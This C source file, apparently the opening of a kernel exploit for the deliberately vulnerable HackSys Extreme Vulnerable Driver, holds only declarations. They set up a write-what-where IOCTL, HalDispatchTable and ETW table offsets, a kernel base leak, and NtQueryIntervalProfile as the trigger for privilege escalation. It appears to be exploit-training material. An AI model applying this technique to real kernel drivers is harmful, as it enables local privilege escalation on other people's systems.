#include <Windows.h>
#include <stdio.h>

#define BANNER (\
"  _    _ ________      _______  \n" \
" | |  | |  ____\\ \\    / /  __ \\ \n" \
" | |__| | |__   \\ \\  / /| |  | |\n" \
" |  __  |  __|   \\ \\/ / | |  | |\n" \
" | |  | | |____   \\  /  | |__| |\n" \
" |_|  |_|______|   \\/   |_____/ \n" \
"                                \n" \
"                                \n" \
)

#define DEVICE "\\\\.\\HackSysExtremeVulnerableDriver"
#define TARGET_IOCTL 0x22200B

#define HAL_DISPATCH_TABLE_PLUS_0X8_OFFSET 0x1E3CE8
#define ETWP_PROVIDER_TABLE_0XE85_OFFSET 0x213FC5

int main(int argc, char** argv);
long long leak_ntoskrnl_base_address();

typedef struct _DRIVER_INPUT
{
	long long* What;
	long long* Where;
} DRIVER_INPUT, * PDRIVER_INPUT;

typedef unsigned int(__stdcall* NtQueryIntervalProfile)(
	unsigned int      ProfileSource,
	PULONG            Interval
	);

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	ULONG				 Reserved3;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 LoadCount;
	WORD                 NameOffset;
	CHAR                 Name[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 0xB
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(__stdcall* NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);